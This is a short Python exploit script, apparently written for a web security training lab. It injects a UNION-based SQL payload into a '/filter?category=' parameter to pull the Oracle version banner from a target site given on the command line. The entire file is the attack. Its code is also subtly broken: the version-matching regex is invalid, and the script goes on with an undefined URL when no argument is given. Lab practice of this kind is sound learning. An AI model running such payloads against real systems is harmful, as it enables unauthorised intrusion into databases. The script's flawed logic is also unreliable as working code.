import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_sqli_version(url):
    path="/filter?category=Pets"
    sqli_payload="'%20UNION%20SELECT%20NULL%2cbanner%20FROM%20v%24version--"
    r=requests.get(url+path+sqli_payload,verify=False,proxies=proxies)
    res=r.text
    if "Oracle Database" in res:
        print("[+]Found the database version🫡...")
        soup=BeautifulSoup(res,'html.parser')
        version=soup.find(text=re.compile('*.Oracle\sDatabase.*')) #\s stands for space
        print(version) 
        return True
    return False
                                        
                
    
    
         
if __name__=="__main__":
    try:
        url=sys.argv[1].strip()
        print("[+] Your code is success")
        
        
    except IndexError:    
        print("[-]Usage %s <url>" % sys.argv[0])
        print("[-]Example %s www.example.com" % sys.argv[0])   
    print("[**]Dumping the version of the databases.........") 
    if not exploit_sqli_version(url):
        print("[-]Unable to dump the version of the database version...")
    